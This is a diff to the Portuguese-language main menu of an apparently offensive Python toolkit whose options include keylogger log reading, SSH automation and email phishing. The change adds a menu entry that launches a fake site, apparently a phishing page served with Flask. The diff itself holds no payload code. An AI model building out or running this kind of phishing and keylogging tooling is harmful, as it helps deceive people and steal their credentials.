@@ -9,6 +9,8 @@ import scan_ports
 import leitor_log
 import ssh_automation
 import email_phish
+from core import fake_site 
+from core import fake_messages
 
 # Inicializa colorama
 init(autoreset=True)
@@ -176,17 +178,18 @@ def print_menu():
     print(Fore.GREEN + "3. " + Fore.WHITE + "Ler logs do Keylogger")
     print(Fore.GREEN + "4. " + Fore.WHITE + "Automação SSH")
     print(Fore.GREEN + "5. " + Fore.WHITE + "Phishing via Email")
-    print(Fore.RED + "6. " + Fore.WHITE + "Sair do programa")
+    print(Fore.GREEN + "6. " + Fore.WHITE + "Iniciar Fake Site")
+    print(Fore.GREEN + "7. " + Fore.WHITE + "Sair do programa")
     print(Fore.BLUE + "\n" + "="*60 + "\n")
 
 def get_choice():
     """Obtém a escolha do usuário com tratamento de erros"""
     while True:
         try:
-            choice = input(Fore.YELLOW + "\nDigite sua opção (0-6): " + Fore.WHITE)
-            if choice in ['0', '1', '2', '3', '4', '5', '6']:
+            choice = input(Fore.YELLOW + "\nDigite sua opção (0-7): " + Fore.WHITE)
+            if choice in ['0', '1', '2', '3', '4', '5', '6', '7']:
                 return choice
-            print(Fore.RED + "\n[ERRO] Opção inválida. Digite um número entre 0 e 5.")
+            print(Fore.RED + "\n[ERRO] Opção inválida. Digite um número entre 0 e 7.")
         except KeyboardInterrupt:
             print(Fore.RED + "\n\nOperação cancelada pelo usuário.")
             return '5'
@@ -242,8 +245,16 @@ def main():
             print_header()
             print(Fore.CYAN + "\n" + " PHANTOM MAIL ".center(60, '=') + "\n")
             email_phish.show_phishing_menu()
-            
+
         elif choice == '6':
+            clear_screen()
+            print_header()
+            print(Fore.CYAN + "\n" + " INICIANDO O FAKE SITE ".center(60, '=') + "\n")
+            print(Fore.YELLOW + "[!] Certifique-se de que o servidor Flask está instalado.")
+            fake_site.iniciar_fake_site()
+            input("\nPressione Enter para continuar...")
+            
+        elif choice == '7':
             clear_screen()
             print_header()
             print(Fore.RED + "\n" + " ENCERRANDO O PROGRAMA ".center(60, '=') + "\n")
